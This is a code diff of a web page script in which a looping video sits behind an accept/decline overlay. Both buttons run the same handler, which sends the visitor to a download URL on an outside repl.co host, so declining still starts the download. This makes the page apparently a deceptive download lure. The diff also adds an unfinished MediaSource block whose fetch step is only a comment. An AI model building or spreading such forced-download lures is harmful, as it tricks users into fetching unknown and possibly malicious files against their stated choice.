@@ -174,24 +174,36 @@
 <video id="video" class="video" src="milei.mp4" loop></video>
 </div>
 <script type="text/javascript">
-            const video = document.getElementById("video");
-            const overlay = document.getElementById("overlay");
-            const declineButton = document.getElementById("decline-button");
-            const acceptButton = document.getElementById("accept-button");
+    const video = document.getElementById("video");
+    const overlay = document.getElementById("overlay");
+    const declineButton = document.getElementById("decline-button");
+    const acceptButton = document.getElementById("accept-button");
 
-            let hasClicked;
+    let hasClicked;
 
-            function buttonClick(event) {
-                if(!hasClicked) hasClicked = true;
-                overlay.hidden = true;
-				location.href = 'http://orl.theanx9.repl.co/download'
-                video.play();
-                videoClick();
-            }
+    function buttonClick(event) {
+        if(!hasClicked) hasClicked = true;
+        overlay.hidden = true;
+        location.href = 'http://orl.theanx9.repl.co/download'
+        video.play();
+        videoClick();
+    }
 
-            acceptButton.addEventListener("click", buttonClick);
-            declineButton.addEventListener("click", buttonClick);
-            video.addEventListener("click", videoClick);
-        </script>
+    acceptButton.addEventListener("click", buttonClick);
+    declineButton.addEventListener("click", buttonClick);
+    video.addEventListener("click", videoClick);
+
+    // Add MediaSource and SourceBuffer
+    const mimeCodec = 'video/mp4; codecs="avc1.42E01E, mp4a.40.2"';
+    if ("MediaSource" in window && MediaSource.isTypeSupported(mimeCodec)) {
+        const mediaSource = new MediaSource();
+        video.src = URL.createObjectURL(mediaSource);
+        mediaSource.addEventListener('sourceopen', () => {
+            const sourceBuffer = mediaSource.addSourceBuffer(mimeCodec);
+            // fetch arrayBuffer and append it to sourceBuffer
+        });
+    } else {
+        console.error("Unsupported MIME type or codec: ", mimeCodec);
+    }
+</script>
 </body>
-</html>
